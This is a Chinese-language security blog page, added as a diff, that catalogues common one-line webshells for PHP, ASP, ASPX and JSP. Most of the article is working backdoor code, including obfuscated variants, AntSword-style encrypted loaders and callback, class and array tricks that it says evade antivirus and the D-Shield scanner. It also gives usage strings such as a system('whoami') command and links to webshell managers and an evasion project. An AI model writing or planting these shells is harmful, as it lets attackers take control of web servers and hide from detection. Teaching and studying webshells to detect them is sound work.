@@ -1,0 +1,421 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>常见Webshell | 晚上十一点睡觉</title><meta name="keywords" content="文件上传,Webshell,命令执行"><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Webshell Webshell简介WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见Webshell">
+<meta property="og:url" content="http://gungnir.top/5917.html">
+<meta property="og:site_name" content="晚上十一点睡觉">
+<meta property="og:description" content="Webshell Webshell简介WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237571.jpeg">
+<meta property="article:published_time" content="2022-11-13T05:55:31.000Z">
+<meta property="article:modified_time" content="2022-11-27T19:04:54.232Z">
+<meta property="article:author" content="晚上十一点睡觉">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="Webshell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237571.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://gungnir.top/5917"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 晚上十一点睡觉","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '常见Webshell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-28 03:04:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">104</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237571.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">晚上十一点睡觉</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">常见Webshell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-13T05:55:31.000Z" title="发表于 2022-11-13 13:55:31">2022-11-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-27T19:04:54.232Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="常见Webshell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/5917.html#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Webshell</p>
+<h1 id="Webshell简介"><a href="#Webshell简介" class="headerlink" title="Webshell简介"></a>Webshell简介</h1><p>WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p>
+<h1 id="常用一句话Webshell"><a href="#常用一句话Webshell" class="headerlink" title="常用一句话Webshell"></a>常用一句话Webshell</h1><blockquote>
+<p> 一句话木马变形有很多种方式，文中举例只是其中几种方式。千奇百怪的变形，不断的变化，都是为了躲避杀软的检测。杀软也在不断的更新规则库。两者都是在博弈中不断的强大。</p>
+</blockquote>
+<h2 id="基础版"><a href="#基础版" class="headerlink" title="基础版"></a>基础版</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php一句话木马： &lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">			  &lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">asp一句话木马： &lt;%eval request(&quot;cmd&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">aspx一句话木马： </span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSP一句话木马:</span><br><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;	//无回显示执行系统命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单变形"><a href="#简单变形" class="headerlink" title="简单变形"></a>简单变形</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ASP一句话木马:</span><br><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;//-7</span><br><span class="line"></span><br><span class="line">ASPX一句话木马:</span><br><span class="line">&lt;%@ Page Language = Jscript %&gt;</span><br><span class="line">&lt;%var/*-/*-*/P/*-/*-*/=/*-/*-*/&quot;e&quot;+&quot;v&quot;+/*-/*-*/</span><br><span class="line">&quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/*-/*-*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*-/*-*/+&quot;s&quot;+&quot;t&quot;+</span><br><span class="line">&quot;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]&quot;+</span><br><span class="line">&quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval</span><br><span class="line">(/*-/*-*/P/*-/*-*/,/*-/*-*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/*-/*-*/);%&gt;//-7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP一句话木马:</span><br><span class="line">&lt;?php $_GET[a]($_GET[b]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSP一句话木马:</span><br><span class="line">&lt;%</span><br><span class="line">if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="二次变形"><a href="#二次变形" class="headerlink" title="二次变形"></a>二次变形</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ASP:</span><br><span class="line">&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ASPX:</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format(&quot;&#123;0:yyyyMMdd&#125;&quot;,DateTime.Now.ToUniversalTime())+&quot;37E4DD20C310142564FC483DB1132F36&quot;, &quot;MD5&quot;).ToUpper()],&quot;unsafe&quot;);%&gt;//随日期变化的连接密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSP：</span><br><span class="line">&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三次变形"><a href="#三次变形" class="headerlink" title="三次变形"></a>三次变形</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ASP:</span><br><span class="line">&lt;%@Page Language=&quot;C#&quot; %&gt;&lt;%@Import namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null)&#123; Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;&#125;byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;//蚁剑中的一句话</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">&lt;?php session_start();isset($_GET[&#x27;pass&#x27;])?print $_SESSION[&#x27;k&#x27;]=substr(md5(uniqid(rand())),16):($b=explode(&#x27;|&#x27;,openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $_SESSION[&#x27;k&#x27;])))&amp;call_user_func($b[0],$b[1]);?&gt;//蚁剑中的一句话</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;//蚁剑中的一句话</span><br></pre></td></tr></table></figure>
+
+<h2 id="四次变形"><a href="#四次变形" class="headerlink" title="四次变形"></a>四次变形</h2><h3 id="利用随机异或无限免杀d盾蚁剑版："><a href="#利用随机异或无限免杀d盾蚁剑版：" class="headerlink" title="利用随机异或无限免杀d盾蚁剑版："></a>利用随机异或无限免杀d盾蚁剑版：</h3><blockquote>
+<p>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/yzddmr6/as_webshell_venom">https://github.com/yzddmr6/as_webshell_venom</a></p>
+</blockquote>
+<h3 id="利用动态二进制加密实现新型一句话木马："><a href="#利用动态二进制加密实现新型一句话木马：" class="headerlink" title="利用动态二进制加密实现新型一句话木马："></a>利用动态二进制加密实现新型一句话木马：</h3><blockquote>
+<p>文章地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://xz.aliyun.com/t/2799">https://xz.aliyun.com/t/2799</a></p>
+</blockquote>
+<h2 id="webshell过D-盾免杀"><a href="#webshell过D-盾免杀" class="headerlink" title="webshell过D 盾免杀"></a>webshell过D 盾免杀</h2><h3 id="使用回调函数：可以成功免杀；"><a href="#使用回调函数：可以成功免杀；" class="headerlink" title="使用回调函数：可以成功免杀；"></a>使用回调函数：可以成功免杀；</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zeo</span>(<span class="params"><span class="variable">$c</span>,<span class="variable">$d</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="title function_ invoke__">pj</span>()(<span class="variable">$c</span>,<span class="variable">$d</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pj</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span><span class="string">&quot;register_shut&quot;</span>.<span class="string">&quot;down_function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=&amp;_POST[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">zeo</span>(assert,<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用类：可以免杀"><a href="#使用类：可以免杀" class="headerlink" title="使用类：可以免杀"></a>使用类：可以免杀</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chello</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">constructStr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ass&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;ert&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">constructStr</span>();</span><br><span class="line"><span class="variable">$temp</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用数组：可以免杀"><a href="#使用数组：可以免杀" class="headerlink" title="使用数组：可以免杀"></a>使用数组：可以免杀</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$a</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// array_map():返回数组，是为 array 每个元素应用 callback() 函数之后的数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用法：?data&#x3D;assert&amp;cmd&#x3D;phpinfo()</p>
+</blockquote>
+<h1 id="Webshell原理"><a href="#Webshell原理" class="headerlink" title="Webshell原理"></a>Webshell原理</h1><h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h2><p>以一个原始而又简单的php一句话木马为例：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    @eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>要点解释：</strong></p>
+<ul>
+<li><p>php的代码要写在 <?php ?> 里面，服务器才能认出来这是php代码，然后才去解析php的内容。</p>
+</li>
+<li><p><code>@</code> 符号的意思是不报错，因为cmd这个变量没有定义而被直接使用，服务器会提醒cmd变量未定义。</p>
+</li>
+<li><p><code>$_POST[&#39;cmd&#39;];</code>的解释：</p>
+<p>php里面有几个超全局变量， <code>$_GET、$_POST</code> 就是其中之一，意思是用 post的方法接收变量cmd传递来的字符。</p>
+<p>比如<code>$_POST[&#39;cmd&#39;]</code>接受到<code>cmd=echo 123</code>，则代码就相当于：<code>&lt;?php @eval(echo 123)?&gt;</code></p>
+</li>
+<li><p><strong>php危险函数</strong>：</p>
+<blockquote>
+<ul>
+<li><code>eval()</code>：把字符串作为PHP代码执行</li>
+<li><code>exec()</code>： 执行一个外部程序</li>
+<li><code>system()</code>：执行外部程序，并且显示输出</li>
+</ul>
+</blockquote>
+</li>
+<li><p>如上所述：<code>eval()</code>函数可以将一个字符串当作php的代码执行~~~，于是</p>
+<p>这串代码<code>&lt;?php @eval(echo 123)?&gt;</code>等价于&#x3D;&#x3D;&#x3D;&#x3D;&gt;<code>&lt;?php echo 123?&gt;</code></p>
+<p>相当于就是通过php执行了一条php的代码命令：<code>echo 123</code></p>
+</li>
+</ul>
+<h2 id="jsp一句话木马"><a href="#jsp一句话木马" class="headerlink" title="jsp一句话木马"></a>jsp一句话木马</h2><blockquote>
+<p>JAVA 执行系统命令的核心就是 <code>Runtime.getRuntime().exec(cmd)</code></p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="利用Webshell做更多事情"><a href="#利用Webshell做更多事情" class="headerlink" title="利用Webshell做更多事情"></a>利用Webshell做更多事情</h1><h2 id="验证webshell是否上传成功"><a href="#验证webshell是否上传成功" class="headerlink" title="验证webshell是否上传成功"></a>验证webshell是否上传成功</h2><p>上传的webshell要有效果的话必须要要满足两个条件，<strong>php语法</strong>和<strong>php文件的后缀</strong>（不然就只有解析漏洞存在时才有机会），即上传的php文件内容是 <code>&lt;?php @eval($_POST[value]);?&gt;</code>类似这种可以被php解析的代码。</p>
+<p>但是一般php类型的文件会被各种服务端拦截方式拦截下来，绕过的话，可以参考另一篇文件上传的文章~~</p>
+<p>文件上传后在相应目录下访问即可证明上传成功，不多赘述</p>
+<h2 id="在hackbar-post进行传入cmd命令"><a href="#在hackbar-post进行传入cmd命令" class="headerlink" title="在hackbar post进行传入cmd命令"></a>在hackbar post进行传入cmd命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd=system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意php代码以分号结尾</li>
+<li>这里使用了命令执行的危险函数：<code>system()</code>;可以通过php执行系统命令~~</li>
+</ul>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131417972.png" alt="image-20221113141706676" style="zoom:33%;" />
+
+<h2 id="Webshell工具连接Webshell"><a href="#Webshell工具连接Webshell" class="headerlink" title="Webshell工具连接Webshell"></a>Webshell工具连接Webshell</h2><blockquote>
+<p>蚁剑、哥斯拉什么的</p>
+</blockquote>
+<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cknife：（PPT文件夹有编译好的exe程序） </span><br><span class="line">https://github.com/Chora10/Cknife</span><br><span class="line">中国菜刀：</span><br><span class="line">https://github.com/raddyfiy/caidao-official-version</span><br></pre></td></tr></table></figure>
+
+<h3 id="蚁剑-AntSword"><a href="#蚁剑-AntSword" class="headerlink" title="蚁剑-AntSword"></a>蚁剑-AntSword</h3><blockquote>
+<p>能生成免杀shell</p>
+</blockquote>
